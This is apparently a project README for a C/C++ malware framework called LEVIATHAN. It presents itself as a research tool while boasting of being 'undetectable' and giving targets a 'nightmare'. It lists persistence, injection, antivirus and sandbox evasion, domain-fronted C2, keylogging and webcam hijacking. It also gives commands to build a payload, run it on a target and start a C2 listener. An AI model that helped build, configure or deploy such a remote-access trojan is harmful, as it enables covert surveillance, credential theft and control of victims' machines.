# LEVIATHAN - The Ultimate Stealth Malware Framework

## ⚠️ WARNING: FOR EDUCATIONAL & RESEARCH PURPOSES ONLY ⚠️
This project is intended for cybersecurity research, red teaming, and ethical hacking **only**. Unauthorized use of this software is illegal and punishable by law. The developers assume **no liability** for misuse.

---

## Overview
LEVIATHAN is a **highly modular, stealth-oriented** malware framework written in **C/C++**, designed to achieve **full persistence, anti-detection, and system dominance**. This is not just another RAT—this is a **fucking nightmare** for any target.

It is built to be **undetectable**, **persistent**, and **unstoppable**, making it ideal for red teaming, ethical hacking demonstrations, and advanced malware research.

---

## Features

### Persistence & Stealth
- **Process Injection** → DLL Injection, Process Hollowing, APC Injection.
- **Registry Persistence** → Auto-runs on startup.
- **Scheduled Task Hijacking** → Runs invisibly as a system task.
- **Service Mode Execution** → Operates as a legitimate Windows service.

### Evasion Techniques
- **String & Code Obfuscation** → XOR + AES encryption.
- **Custom Packer** → No reliance on detectable packers like UPX.
- **Anti-VM & Anti-Sandbox** → Evades detection inside VirtualBox, VMware, and Cuckoo.
- **API Unhooking** → Bypasses security software hooks.

### C2 Communication & Control
- **AES/XOR Encrypted Traffic** → No plaintext communication.
- **Domain Fronting** → Uses trusted cloud services to hide C2.
- **Peer-to-Peer C2 Backup** → If main server is down, infected nodes relay commands.

### Advanced Features
- **Keylogging** → Logs and transmits keystrokes.
- **Webcam Hijacking** → Captures webcam footage.
- **File Manipulation** → Upload, download, delete files.
- **Privilege Escalation** → Exploits system vulnerabilities.
- **Self-Destruction Trigger** → Securely wipes itself if needed.

---

## Installation & Setup

### Compile the Builder
LEVIATHAN uses a **custom payload generator** that injects C2 parameters into the malware binary.

```sh
make build
```

### Generate Payload
Run the builder to generate a fully obfuscated, encrypted payload.
```sh
./leviathan-builder -i <YOUR_IP> -p <PORT>
```

### Deploy & Execute
Execute the payload on the target machine. If running manually:
```sh
leviathan.exe
```

### Connect to C2
Launch your C2 server and listen for connections:
```sh
python3 leviathan-c2.py --listen -p <PORT>
```

---

## Configuration
Modify `config.h` to adjust stealth, persistence, and encryption settings.

```cpp
#define ENABLE_KEYLOGGING true
#define ENABLE_WEBCAM_HIJACK false
#define OBFUSCATION_LEVEL 3 // 1-3
#define ENCRYPTION_METHOD AES
```

---

## Uninstall (if you messed up)
If you need to **remove** LEVIATHAN from a system:
```sh
leviathan.exe --self-destruct
```
OR manually remove registry entries, scheduled tasks, and services.

---

## Legal Disclaimer
This project is intended **only for legal security testing and research**. Any unauthorized use is strictly prohibited. The developers are **not responsible for any misuse**.

---

## Future Enhancements
- [ ] **Rootkit-Level Persistence** (Kernel-mode hiding)
- [ ] **AI-Based Evasion** (Automated attack adjustments)
- [ ] **Multi-Platform Support** (Linux & macOS versions)

---

## Credits
Developed by **Loki**, a cybersecurity researcher and ethical hacker dedicated to pushing the limits of malware research. 👁‍🗨


